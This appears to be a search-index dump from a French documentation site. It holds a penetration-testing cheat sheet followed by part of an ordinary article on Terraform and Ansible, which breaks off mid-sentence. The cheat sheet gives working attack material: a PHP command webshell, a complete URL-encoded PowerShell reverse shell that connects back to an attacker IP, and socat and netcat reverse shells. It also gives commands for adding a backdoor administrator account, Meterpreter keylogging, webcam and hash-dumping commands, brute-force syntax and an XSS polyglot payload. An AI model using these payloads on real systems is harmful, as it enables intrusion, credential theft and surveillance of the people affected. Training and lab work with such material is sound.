</p>"},{"location":"PenTest_Cheat_Sheet/#nmap","title":"NMAP","text":"<p>Trop de param\u00e8tre possible, se r\u00e9f\u00e9rer \u00e0 \u00e7a : Cheat sheet</p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe","title":"Syntaxe","text":"<p>Scan port <code>nmap -T4 -sC -sV -Pn &lt;IP&gt;</code></p> <p>Scan Samba <code>nmap -p &lt;PORT&gt; --script=smb-enum-shares.nse,smb-enum-users.nse &lt;IP&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#enum4linux","title":"Enum4linux","text":""},{"location":"PenTest_Cheat_Sheet/#syntaxe_1","title":"Syntaxe","text":"<p>Scan basique <code>enum4linux -a &lt;IP&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#gobuster","title":"GOBUSTER","text":""},{"location":"PenTest_Cheat_Sheet/#parametre","title":"Param\u00e8tre","text":"<p><code>-u &lt;URL&gt;</code> <code>-w &lt;WORDLIST&gt;</code> <code>-t &lt;NOMBRE DE THREAD&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_2","title":"Syntaxe","text":"<p><code>gobuster dir -u &lt;URL&gt; -w &lt;WORDLIST&gt; -t &lt;NOMBRE DE THREAD&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#exemple","title":"Exemple","text":"<p><code>gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> </p>"},{"location":"PenTest_Cheat_Sheet/#nikto","title":"NIKTO","text":""},{"location":"PenTest_Cheat_Sheet/#parametre_1","title":"Param\u00e8tre","text":"<p><code>-h &lt;URL&gt;</code> <code>-p &lt;PORT&gt;</code> <code>-Plugin &lt;PLUGIN&gt;</code> <code>-Display &lt;1|2|E&gt;</code> <code>-Tuning &lt;0|2|3|4|8|9&gt;</code> <code>-o &lt;FICHIER&gt;</code> Output </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_3","title":"Syntaxe","text":"<p>Header <code>nikto -h &lt;IP&gt; -p &lt;PORT&gt;</code></p> <p>Plugin <code>nikto -h &lt;IP&gt; -Plugin &lt;PLUGIN&gt;</code></p> <p>Verbose <code>nikto -h &lt;IP&gt; -Display &lt;1|2|E&gt;</code></p> <p>1 : Redirections 2 : Cookies E : Erreurs</p> <p>Vuln\u00e9rabilit\u00e9s <code>nikto -h &lt;IP&gt; -Tuning &lt;0|2|3|4|8|9&gt;</code> </p> <p>0 : T\u00e9l\u00e9versement de fichier 2 : D\u00e9fauts de configuration / Fichiers par d\u00e9faut 3 : Divulgation d'informations 4 : Injection 8 : Execution de commande 9 : Injection SQL  </p> <p>Output <code>nikto -h &lt;IP&gt; -o &lt;FICHIER&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#wpscan","title":"WPSCAN","text":""},{"location":"PenTest_Cheat_Sheet/#parametre_2","title":"Param\u00e8tre","text":"<p><code>--url &lt;URL&gt;</code> <code>\u2013-passwords &lt;WORDLIST&gt;</code> <code>\u2013-usernames &lt;UTILISATEUR&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_4","title":"Syntaxe","text":"<p>Th\u00e8me <code>wpscan --url &lt;URL&gt; --enumerate t</code></p> <p>Plugins <code>wpscan --url &lt;URL&gt; --enumerate p</code></p> <p>Utilisateur <code>wpscan --url &lt;URL&gt; --enumerate u</code></p> <p>Brute-force <code>wpscan --url &lt;URL&gt; \u2013-passwords &lt;WORDLIST&gt; \u2013-usernames &lt;UTILISATEUR&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#vulnerabilites-dupload","title":"Vuln\u00e9rabilit\u00e9s d'upload","text":"<ul> <li> <p>Trouver o\u00f9 les fichiers uploader sont d\u00e9pos\u00e9s <code>gobuster dir -u &lt;URL&gt; -w &lt;WORDLIST&gt; -x &lt;EXTENSION&gt; -t 100</code> </p> </li> <li> <p>Enlever le filter c\u00f4t\u00e9 client via BurpSuite  </p> </li> <li> <p>Rechercher quel language le back-end utilise via Wappalizer ou les headers des r\u00e9ponses HTTP (PHP, C#, Node.js, Python, Ruby on Rails, etc.)  </p> </li> <li> <p>T\u00e9l\u00e9charger un reverse shell dans le language et remplacer l'IP/Port par ceux voulus  </p> </li> <li> <p>Nommer le shell avec l'extension qui bypass le filtre c\u00f4t\u00e9 serveur ou changer le type MIME sur BurpSuite  </p> </li> <li> <p>Enumeration pour retrouver le fichier upload\u00e9 (au cas o\u00f9 il aurait \u00e9t\u00e9 renomm\u00e9) <code>gobuster dir -u &lt;URL/URI&gt; -w &lt;WORDLIST&gt; -x &lt;EXTENSION&gt; -t 100</code></p> </li> <li> <p>Une fois le fichier trouv\u00e9, trouver un moyen de l'executer (URI, argument ou console) Ne pas oublier d'avoir son port en \u00e9coute lors de l'execution</p> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#reverse-shell","title":"Reverse Shell","text":""},{"location":"PenTest_Cheat_Sheet/#webshell","title":"WebShell","text":"<p>Linux </p> <ul> <li>Copier puis modifier /usr/share/webshells/php/php-reverse-shell.php <code>$ip = '&lt;IP ATTAQUANT&gt;';</code> <code>$port = &lt;PORT&gt;;</code> </li> <li>Puis upload sur le site et acc\u00e9der au fichier</li> </ul> <p>Windows </p> <ul> <li> <p>Cr\u00e9er un fichier php avec la ligne suivante : <code>&lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt;</code></p> </li> <li> <p>Entrer l'URL du fichier avec l'argument \"cmd\" et la valeur: powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</p> </li> </ul> <p>Alors oui, c'est illisible parce que c'est encod\u00e9 pour un URL mais c'est qu'il faut retenir c'est qu'il n'y a qu'\u00e0 changer l'ip et le port (en gras) avant de charger l'URL</p> <ul> <li> <p>On se log avec son listener pr\u00e9f\u00e9r\u00e9 puis on se cr\u00e9er un utlisateur qu'on met dans le groupe admin <code>net user &lt;utlisateur&gt; &lt;mdp&gt; /add</code> <code>net localgroup administrators &lt;utlisateur&gt; /add</code></p> </li> <li> <p>Plus qu'\u00e0 se log en RDP <code>sudo apt install freerdp2-x11</code> <code>xfreerdp /v:&lt;IP CIBLE&gt; /u:&lt;utlisateur&gt; /p:&lt;mdp&gt;</code></p> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#netcat-reverse-shell","title":"Netcat Reverse Shell","text":""},{"location":"PenTest_Cheat_Sheet/#syntaxe_5","title":"Syntaxe","text":"<p><code>nc -lvnp &lt;PORT&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#stabilisation","title":"Stabilisation","text":"<p><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code> (ou python/python2/python3) <code>export TERM=xterm</code> <code>CTRL+Z</code> <code>stty raw -echo; fg</code></p>"},{"location":"PenTest_Cheat_Sheet/#meterpreter","title":"Meterpreter","text":"<p>Commandes principales</p> <p><code>background</code> : Met en arri\u00e8re-plan la session en cours <code>exit</code> : Termine la session Meterpreter <code>guid</code> : R\u00e9cup\u00e8re le GUID de la session  <code>help</code> : Affiche le menu d'aide <code>info</code> : Affiche des informations sur un module Post <code>irb</code> : Ouvre un shell Ruby interactif sur la session courante <code>load</code> : Charge une ou plusieurs extensions de Meterpreter <code>migrate</code> : Permet de migrer Meterpreter vers un autre processus <code>run</code> : Ex\u00e9cute un script Meterpreter ou un module Post <code>sessions</code> : Permet de passer rapidement \u00e0 une autre session  </p> <p>Commandes du syst\u00e8me de fichiers</p> <p><code>cd</code> : Change de r\u00e9pertoire <code>ls</code> : Liste les fichiers du r\u00e9pertoire courant (dir fonctionne aussi) <code>pwd</code> : Imprime le r\u00e9pertoire de travail actuel <code>edit</code> : vous permet d'\u00e9diter un fichier <code>cat</code> : Affiche le contenu d'un fichier \u00e0 l'\u00e9cran. <code>rm</code> : Efface le fichier sp\u00e9cifi\u00e9 <code>search</code> : Recherche des fichiers <code>upload</code> : Charge un fichier ou un r\u00e9pertoire <code>download</code> : T\u00e9l\u00e9chargera un fichier ou un r\u00e9pertoire  </p> <p>Commandes de mise en r\u00e9seau</p> <p><code>arp</code> : Affiche le cache ARP de l'h\u00f4te. <code>ifconfig</code> : Affiche les interfaces r\u00e9seau disponibles sur le syst\u00e8me cible <code>netstat</code> : Affiche les connexions r\u00e9seau <code>portfwd</code> : Transmet un port local \u00e0 un service distant <code>route</code> : Permet d'afficher et de modifier la table de routage.   </p> <p>Commandes du syst\u00e8me</p> <p><code>clearev</code> : Efface les journaux d'\u00e9v\u00e9nements <code>execute</code> : Ex\u00e9cute une commande <code>getpid</code> : Affiche l'identifiant du processus en cours <code>getuid</code> : Affiche l'utilisateur sous lequel Meterpreter est ex\u00e9cut\u00e9 <code>kill</code> : Termine un processus <code>pkill</code> : Termine les processus par leur nom <code>ps</code> : Liste les processus en cours d'ex\u00e9cution <code>reboot</code> : Red\u00e9marre l'ordinateur distant <code>shell</code> : Permet d'entrer dans un shell de commande du syst\u00e8me <code>shutdown</code> : Arr\u00eate l'ordinateur distant <code>sysinfo</code> : Obtient des informations sur le syst\u00e8me distant, telles que OS  </p> <p>Autres commandes (elles seront list\u00e9es sous diff\u00e9rentes cat\u00e9gories dans le menu d'aide) </p> <p><code>idletime</code> : Renvoie le nombre de secondes d'inactivit\u00e9 de l'utilisateur distant. <code>keyscan_dump</code> : Vide la m\u00e9moire tampon des frappes <code>keyscan_start</code> : Commence \u00e0 capturer les frappes de clavier <code>keyscan_stop</code> : Arr\u00eate la capture des frappes <code>screenshare</code> : Permet de regarder le bureau de l'utilisateur distant en temps r\u00e9el <code>screenshot</code> : Capture d'\u00e9cran du bureau interactif <code>record_mic</code> : Enregistre le son du microphone par d\u00e9faut pendant X secondes <code>webcam_chat</code> : D\u00e9marre un chat vid\u00e9o <code>webcam_list</code> : Liste les webcams <code>webcam_snap</code> : Prend un instantan\u00e9 de la webcam sp\u00e9cifi\u00e9e <code>webcam_stream</code> : Lit un flux vid\u00e9o \u00e0 partir de la webcam sp\u00e9cifi\u00e9e <code>getsystem</code> : Tente d'\u00e9lever vos privil\u00e8ges \u00e0 ceux du syst\u00e8me local <code>hashdump</code> : Extrait le contenu de la base de donn\u00e9es SAM  </p>"},{"location":"PenTest_Cheat_Sheet/#socat-basic-reverse-shell","title":"Socat Basic Reverse Shell","text":"<p>Attaquant <code>socat TCP-L:&lt;PORT&gt; -</code> =&gt; Universel <code>socat TCP-L:&lt;PORT&gt; EXEC:\"bash -li\"</code> =&gt; Linux <code>socat TCP-L:&lt;PORT&gt; EXEC:pwsh,pipes</code> =&gt; Windows  </p> <p>Cible <code>socat TCP:&lt;IP ATTAQUANT&gt;:&lt;PORT&gt; EXEC:\"bash -li\"</code> =&gt; Linux <code>socat TCP-L:&lt;IP ATTAQUANT&gt;:&lt;PORT&gt; EXEC:pwsh,pipes</code> =&gt; Windows  </p>"},{"location":"PenTest_Cheat_Sheet/#socat-extended-reverse-shell","title":"Socat Extended Reverse Shell","text":"<p><code>socat TCP:&lt;IP ATTAQUANT&gt;:&lt;PORT&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane</code></p>"},{"location":"PenTest_Cheat_Sheet/#merterpreter","title":"Merterpreter","text":"<p><code>msfvenom --list payload</code> <code>msfvenom -p &lt;PAYLOAD&gt; -f &lt;FORMAT&gt; -o &lt;OUTPUT&gt; LHOST=&lt;IP ATTAQUANT&gt; LPORT=&lt;PORT&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#escalade-de-privileges-sous-linux","title":"Escalade de privil\u00e8ges sous Linux","text":""},{"location":"PenTest_Cheat_Sheet/#enumeration","title":"\u00c9num\u00e9ration","text":"<ul> <li>LinEnum </li> <li>LinPEAS</li> </ul>"},{"location":"PenTest_Cheat_Sheet/#scripts","title":"Scripts","text":"<ul> <li>LES (Linux Exploit Suggester) </li> <li>Linux Smart Enumeration </li> <li>Linux Priv Checker </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#sequences-dechappement-shell","title":"S\u00e9quences d'\u00e9chappement Shell","text":"<p>GTFOBins </p> <ul> <li>Variable d'environnement sudo</li> <li>Crontab en g\u00e9n\u00e9ral</li> <li>SUID/SGID <ul> <li><code>find / -perm -2000 -type f 2&gt;/dev/null</code></li> <li><code>find / -perm -4000 -type f 2&gt;/dev/null</code> </li> <li><code>find / -perm -6000 -type f 2&gt;/dev/null</code> </li> </ul> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#autres","title":"Autres","text":"<p>/etc/shadow en lecture/\u00e9criture</p> <p>/etc/passwd en lecture/\u00e9criture</p> <p>Cl\u00e9s SSH</p> <p>Mot de passe dans les fichiers de configurations</p> <p>NFS</p> <p>Exploit Kernel (\u00e0 \u00e9viter car peut d\u00e9stabiliter le syst\u00e8me)</p> <p>Capabilities <code>getcap -r / 2&gt;/dev/null</code></p>"},{"location":"PenTest_Cheat_Sheet/#escalade-de-privileges-sous-windows","title":"Escalade de privil\u00e8ges sous Windows","text":""},{"location":"PenTest_Cheat_Sheet/#enumeration_1","title":"\u00c9num\u00e9ration","text":"<ul> <li>WinPEAS </li> <li>PowerUp <ul> <li><code>. .\\PowerUp.ps1</code> </li> <li><code>Invoke-AllChecks</code> </li> </ul> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#scripts_1","title":"Scripts","text":"<ul> <li>PrivescCheck </li> <li>WES-NG </li> <li>multi/recon/local_exploit_suggester avec une session meterpreter  </li> </ul>"},{"location":"PenTest_Cheat_Sheet/#sequences-dechappement","title":"S\u00e9quences d'\u00e9chappement","text":"<p>lolbas </p>"},{"location":"PenTest_Cheat_Sheet/#johntheripper","title":"JohnTheRipper","text":""},{"location":"PenTest_Cheat_Sheet/#parametre_3","title":"Param\u00e8tre","text":"<p><code>--wordlist=&lt;WORDLIST&gt;</code> Wordlist <code>--show &lt;FICHIER&gt;</code> Renvoie les mots de passes crack\u00e9</p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_6","title":"Syntaxe","text":"<p><code>john --wordlist=&lt;WORDLIST&gt; &lt;FICHIER&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#hashcat","title":"Hashcat","text":"<p>Liste hash</p>"},{"location":"PenTest_Cheat_Sheet/#parametre_4","title":"Param\u00e8tre","text":"<p><code>-a &lt;VALEUR&gt;</code> Type d'attaque <code>-m &lt;VALEUR&gt;</code> Type de hash </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_7","title":"Syntaxe","text":"<p><code>hashcat -a &lt;VALEUR&gt; -m &lt;VALEUR&gt; &lt;FICHIER&gt; &lt;WORDLIST&gt;</code> </p>"},{"location":"PenTest_Cheat_Sheet/#exemple_1","title":"Exemple","text":"<p><code>hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt</code></p>"},{"location":"PenTest_Cheat_Sheet/#sqlmap","title":"SQLmap","text":"<p>CheatSheet</p>"},{"location":"PenTest_Cheat_Sheet/#parametre_5","title":"Param\u00e8tre","text":"<p><code>-u \"&lt;URL&gt;\"</code> <code>-p \"&lt;PARAM A TESTER&gt;\"</code> <code>--current-user</code> R\u00e9cup\u00e8re l'utilisateur courant <code>--is-dba</code> V\u00e9rifie si l'utilisateur courant est admin <code>--hostname</code> R\u00e9cup\u00e8re le nom de l'h\u00f4te <code>--users</code> R\u00e9cup\u00e8re les utilisateurs de la base de donn\u00e9es <code>--passwords</code> R\u00e9cup\u00e8re les mots de passe des utilisateurs de la base de donn\u00e9es <code>--privileges</code> R\u00e9cup\u00e8re les privil\u00e8ges <code>--all</code> R\u00e9cup\u00e8re tout <code>--dump</code> Dump les entr\u00e9es des tables <code>--dbs</code> Nom des bases de donn\u00e9es disponible <code>--tables</code> R\u00e9cup\u00e8re les tables de la base de donn\u00e9es ( -D  ) <code>--columns</code> R\u00e9cup\u00e8re les colonnes de la base de donn\u00e9es ( -D  -T  ) <code>-D &lt;NOM DB&gt; -T &lt;NOM TABLE&gt; -C &lt;NOM COLONNE&gt;</code> Dump les colonnes <code>--os-cmd</code> Ex\u00e9cute une commande shell <code>--os-shell</code> Cr\u00e9\u00e9 un session shell simple <code>--os-pwn</code> D\u00e9marre un reverse shell <code>--file-read=/chemin/vers/le/fichier</code> Lire le contenu d'un fichier"},{"location":"PenTest_Cheat_Sheet/#syntaxe_8","title":"Syntaxe","text":"<p>A partir d'une capture <code>sqlmap -r req.txt --current-user</code></p> <p>A partir d'une requ\u00eate POST <code>sqlmap -u \"http://exemple.com\" --data \"username=*&amp;password=*\"</code></p>"},{"location":"PenTest_Cheat_Sheet/#hydra","title":"Hydra","text":""},{"location":"PenTest_Cheat_Sheet/#parametres","title":"Param\u00e8tres","text":"<p><code>-l &lt;UTILISATEUR&gt;</code> <code>-L &lt;LISTE UTILISATEUR&gt;</code> <code>-P &lt;WORDLIST&gt;</code> <code>-t &lt;NOMBRE DE THREAD&gt; (16 par d\u00e9faut)</code> <code>-V (mode verbeux)</code> </p>"},{"location":"PenTest_Cheat_Sheet/#syntaxe_9","title":"Syntaxe","text":"<p>FTP <code>hydra -l &lt;UTILISATEUR&gt; -P &lt;WORDLIST&gt; -t 64 ftp://&lt;IP&gt;</code></p> <p>SSH <code>hydra -l &lt;UTILISATEUR&gt; -P &lt;WORDLIST&gt; &lt;IP&gt; -t 64 ssh</code></p> <p>Formulaire web POST <code>hydra &lt;UTILISATEUR&gt; &lt;WORDLIST&gt; &lt;IP&gt; http-post-form \"&lt;CHEMIN&gt;:&lt;IDENTIFIANT&gt;:&lt;REPONSE_INVALIDE&gt;\"</code> Exemple : <code>hydra -l &lt;UTILISATEUR&gt; -P &lt;WORDLIST&gt; &lt;IP&gt; http-post-form \"/:username=^USER^&amp;password=^PASS^:F=Your username or password is incorrect\"</code></p>"},{"location":"PenTest_Cheat_Sheet/#samba","title":"Samba","text":"<p>Acc\u00e8s <code>smbclient //&lt;IP&gt;/&lt;PARTAGE&gt;</code></p> <p>T\u00e9l\u00e9chargement <code>smbget -R smb://&lt;IP&gt;/&lt;PARTAGE&gt;</code></p>"},{"location":"PenTest_Cheat_Sheet/#exploit","title":"Exploit","text":"<p>Exploit Database</p>"},{"location":"PenTest_Cheat_Sheet/#metasploit","title":"MetaSploit","text":"<p><code>msfconsole</code> <code>search &lt;KEYWORD&gt;</code> <code>use &lt;NOMBRE&gt;</code> <code>options</code> <code>set &lt;OPTION&gt;</code> <code>run</code> </p>"},{"location":"PenTest_Cheat_Sheet/#cross-site-scripting","title":"Cross-Site scripting","text":""},{"location":"PenTest_Cheat_Sheet/#xss-polyglot-payload","title":"XSS Polyglot Payload","text":"<p><code>jaVasCript:/*-/*'/*'/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\\x3e</code> (Remplacer les ' par `)</p>"},{"location":"PenTest_Cheat_Sheet/#injection-de-commande","title":"Injection de commande","text":"<p>Cheat Sheet </p>"},{"location":"Terraform_Ansible/","title":"Automatisation du d\u00e9ploiement d\u2019infrastructure avec Terraform et Ansible","text":""},{"location":"Terraform_Ansible/#introduction-a-linfrastructure-as-code-iac","title":"Introduction \u00e0 l'Infrastructure as Code (IaC)","text":""},{"location":"Terraform_Ansible/#definition-et-enjeux-principaux","title":"D\u00e9finition et enjeux principaux","text":"<p>L'Infrastructure as Code transforme fondamentalement l'approche de gestion des infrastructures. Cette m\u00e9thodologie remplace les interventions manuelles et les scripts ponctuels par des fichiers de configuration versionn\u00e9s et reproductibles. Cette transition s'apparente \u00e0 l\u2019automatisation d'un processus manuel, o\u00f9 chaque \u00e9tape devient document\u00e9e et reproductible.</p>"},{"location":"Terraform_Ansible/#problemes-abordes","title":"Probl\u00e8mes abord\u00e9s","text":"<p>Les d\u00e9fis li\u00e9s \u00e0 l\u2019IaC incluent la structuration du code pour assurer la lisibilit\u00e9 et la maintenabilit\u00e9, la validation des configurations pour \u00e9viter des interruptions de service, et la s\u00e9curisation des secrets et fichiers d\u2019\u00e9tat. Ces aspects sont cruciaux pour \u00e9viter des probl\u00e8mes li\u00e9s \u00e0 des configurations erron\u00e9es ou des fuites de donn\u00e9es sensibles.</p>"},{"location":"Terraform_Ansible/#analyse-des-outils-et-approches","title":"Analyse des outils et approches","text":"<p>L'utilisation combin\u00e9e de Terraform et Ansible offre une solution compl\u00e8te pour l'automatisation des infrastructures. Terraform se charge du provisioning des ressources, d\u00e9finissant la structure fondamentale de l'infrastructure. Ansible prend ensuite le relais pour la configuration fine des syst\u00e8mes, l'installation des applications et la maintenance des services. Cette compl\u00e9mentarit\u00e9 permet une gestion compl\u00e8te du cycle de vie des infrastructures.</p>"},{"location":"Terraform_Ansible/#fonctions-des-outils","title":"Fonctions des outils","text":""},{"location":"Terraform_Ansible/#terraform","title":"Terraform","text":"<p>Comme son nom l\u2019indique, permet le param\u00e9trage des \u201ccouches basses\u201d de l\u2019infrastructure, d\u00e9claration des sous-r\u00e9seaux et cr\u00e9ation des machines virtuelles par exemple.</p> <p>Le workflow de Terraform se pr\u00e9sente comme ceci :</p> <p></p> <p>Il reposent sur cinq \u00e9tapes cl\u00e9s : Write, Init, Plan, Apply et Destroy et sur l\u2019enregistrement du state:</p> <ol> <li>Write: L\u2019\u00e9criture de la configuration.</li> <li>Init: L\u2019initialisation de la configuration pour installer les d\u00e9pendances n\u00e9cessaires.</li> <li>Plan: L\u2019audit des changements et validation si vous les acceptez.</li> <li>Apply: L'application des changements \u00e0 l\u2019infrastructure r\u00e9elle.</li> <li>Destroy: Le d\u00e9commissionnement de toute l\u2019infrastructure.</li> </ol>"},{"location":"Terraform_Ansible/#ansible","title":"Ansible","text":"<p>Au moyen d\u2019inventaires (statiques ou dynamiques), permet la configuration d\u00e9taill\u00e9e des machines virtuelles. Dans le cas pr\u00e9sent, Ansible vient finaliser les VM cr\u00e9\u00e9es dans le process de Terraform, pour y d\u00e9ployer les pr\u00e9requis au bon fonctionnement des applications sur le syst\u00e8me ou apposer du hardening.</p> <p>Ses composants cl\u00e9s sont les suivants :</p> <p></p> <ul> <li>Le Node Manager ou control node, est le poste depuis lequel tout est ex\u00e9cut\u00e9 via des connexions, essentiellement en SSH, aux n\u0153uds cibles.</li> <li>Le playbook d\u00e9crit une suite de t\u00e2ches ou de r\u00f4les \u00e9crits dans un fichier au format YAML.</li> <li>L\u2019inventaire quant \u00e0 lui d\u00e9crit les syst\u00e8mes cibles g\u00e9r\u00e9s par Ansible. \u00c0 chaque node de l\u2019inventaire, on peut attribuer des variables. On distingue deux types d\u2019inventaire :</li> <li>l\u2019inventaire statique constitu\u00e9 de fichier(s) plats.</li> <li>l\u2019inventaire dynamique fourni par un syst\u00e8me centralis\u00e9. Ex: L\u2019inventaire AWS EC2.</li> </ul>"},{"location":"Terraform_Ansible/#structuration-efficace-du-code-dinfrastructure","title":"Structuration efficace du code d'infrastructure","text":"<p>La structure du code d'infrastructure n\u00e9cessite une organisation m\u00e9thodique.</p>"},{"location":"Terraform_Ansible/#organisation-des-fichiers","title":"Organisation des fichiers","text":""},{"location":"Terraform_Ansible/#structure-typique-pour-terraform","title":"Structure typique pour Terraform","text":"<p>Les configurations Terraform se divisent en modules r\u00e9utilisables, chacun d\u00e9di\u00e9 \u00e0 un aspect sp\u00e9cifique de l'infrastructure. La s\u00e9paration des fichiers selon leur fonction am\u00e9liore la lisibilit\u00e9 et la maintenabilit\u00e9 :</p> <ul> <li>main.tf contient les ressources principales</li> </ul> <p></p> <ul> <li>variables.tf d\u00e9finit les param\u00e8tres</li> </ul> <p></p> <ul> <li>outputs.tf affiche les r\u00e9sultats</li> </ul> <p></p> <ul> <li>providers.tf est utilis\u00e9 pour sp\u00e9cifier les providers dont le module d\u00e9pend</li> </ul> <p></p> <p>Les environnements (dev, prod) sont \u00e9galement g\u00e9r\u00e9s dans des dossiers distincts, chacun ayant ses propres configurations sp\u00e9cifiques.</p>"},{"location":"Terraform_Ansible/#structure-typique-pour-ansible","title":"Structure typique pour Ansible","text":"<p>Pour Ansible, l'organisation (dans l\u2019inventaire) en r\u00f4les permet d'encapsuler des configurations sp\u00e9cifiques et de les r\u00e9utiliser selon les besoins. Les inventaires sont hi\u00e9rarchis\u00e9s en fonction des environnements et des groupes de machines, avec des variables sp\u00e9cifiques aux h\u00f4tes ou aux groupes dans des fichiers d\u00e9di\u00e9s.</p> <p>Les inventaires peuvent \u00eatre sous deux formats :</p> <ul> <li>Le format INI est le plus simple et le plus direct pour cr\u00e9er un inventaire. Il est particuli\u00e8rement appr\u00e9ci\u00e9 pour sa lisibilit\u00e9 et sa facilit\u00e9 de r\u00e9daction.</li> </ul> <p></p> <ul> <li>Le format YAML, d\u2019autre part, offre une structure plus riche et est souvent pr\u00e9f\u00e9r\u00e9 pour des inventaires plus complexes. YAML permet une repr\u00e9sentation plus hi\u00e9rarchique et est particuli\u00e8rement utile pour d\u00e9finir des structures imbriqu\u00e9es et des variables de mani\u00e8re plus visuelle.</li> </ul> <p></p>"},{"location":"Terraform_Ansible/#bonnes-pratiques-de-structuration","title":"Bonnes pratiques de structuration","text":"<p>L\u2019utilisation de conventions de nommage uniformes et bien commenter garantit que le code reste compr\u00e9hensible \u00e0 long terme. Le versioning des modules et r\u00f4les pour g\u00e9rer leurs mises \u00e0 jour facilite \u00e9galement leur maintenance. Enfin, la documentation de la structure et l\u2019utilisation des fichiers permet aux nouveaux membres de l\u2019\u00e9quipe de s\u2019adapter rapidement.</p>"},{"location":"Terraform_Ansible/#strategie-de-tests-et-validation","title":"Strat\u00e9gie de tests et validation","text":"<p>La validation et les tests constituent une \u00e9tape cruciale du processus de d\u00e9ploiement. L'utilisation syst\u00e9matique de terraform plan permet d'anticiper les modifications avant leur application. Les tests avec Molecule pour Ansible assurent la fiabilit\u00e9 des configurations dans des environnements isol\u00e9s. Cette approche pr\u00e9ventive r\u00e9duit significativement les risques d'erreurs en production.</p>"},{"location":"Terraform_Ansible/#tests-pour-terraform","title":"Tests pour Terraform","text":"<p>Les tests incluent la validation syntaxique avec terraform validate, l'analyse des impacts des modifications avec terraform plan, et les tests unitaires avec Terratest. Ces outils d\u00e9tectent les erreurs potentielles avant l\u2019application r\u00e9elle des modifications, r\u00e9duisant ainsi les risques.</p>"},{"location":"Terraform_Ansible/#tests-pour-ansible","title":"Tests pour Ansible","text":"<p>L\u2019outil ansible-lint garantit que les playbooks respectent les meilleures pratiques, tandis que Molecule permet de simuler des environnements pour tester les r\u00f4les en conditions r\u00e9elles. La v\u00e9rification d\u2019idempotence s\u2019assure que les t\u00e2ches peuvent \u00eatre rejou\u00e9es sans entra\u00eener de changement impr\u00e9vu.</p>"},{"location":"Terraform_Ansible/#automatisation-des-tests","title":"Automatisation des tests","text":"<p>L\u2019int\u00e9gration des tests dans des pipelines CI/CD permet une validation continue des changements avant leur d\u00e9ploiement. Les environnements de test, tels que des sandbox cloud ou des machines virtuelles locales, garantissent que les modifications n'affectent pas les syst\u00e8mes critiques.</p>"},{"location":"Terraform_Ansible/#bonnes-pratiques-de-validation","title":"Bonnes pratiques de validation","text":"<p>Tester dans des environnements qui refl\u00e8tent la production autant que possible (iso-prod) est essentiel pour anticiper les probl\u00e8mes. Mesurer des m\u00e9triques comme le taux de succ\u00e8s des tests ou le temps d\u2019ex\u00e9cution aide \u00e0 \u00e9valuer la qualit\u00e9 des changements.</p>"},{"location":"Terraform_Ansible/#gestion-des-secrets-de-maniere-securisee","title":"Gestion des secrets de mani\u00e8re s\u00e9curis\u00e9e","text":"<p>La gestion s\u00e9curis\u00e9e des secrets s'effectue via des outils sp\u00e9cialis\u00e9s comme HashiCorp Vault ou Ansible Vault. Ces solutions permettent de stocker et g\u00e9rer les informations sensibles de mani\u00e8re centralis\u00e9e et s\u00e9curis\u00e9e, tout en maintenant leur accessibilit\u00e9 pour les processus automatis\u00e9s qui en ont besoin.</p>"},{"location":"Terraform_Ansible/#outils-recommandes","title":"Outils recommand\u00e9s","text":"<p>HashiCorp Vault est la solution de gestion des secrets de l\u2019\u00e9diteur de Terraform tandis que AWS et Azure int\u00e8grent nativement la gestion des secrets pour leurs plateformes respectives avec AWS Secrets Manager et Azure Key Vault. Ansible Vault permet \u00e9galement de prot\u00e9ger les secrets sensibles tout en restant int\u00e9gr\u00e9 au processus d\u2019automatisation.</p>"},{"location":"Terraform_Ansible/#bonnes-pratiques-de-gestion-des-secrets","title":"Bonnes pratiques de gestion des secrets","text":"<p>Les secrets ne doivent jamais \u00eatre inclus en clair dans le code versionn\u00e9. Leur stockage doit \u00eatre s\u00e9curis\u00e9 et leur acc\u00e8s limit\u00e9 au strict n\u00e9cessaire (principe du moindre 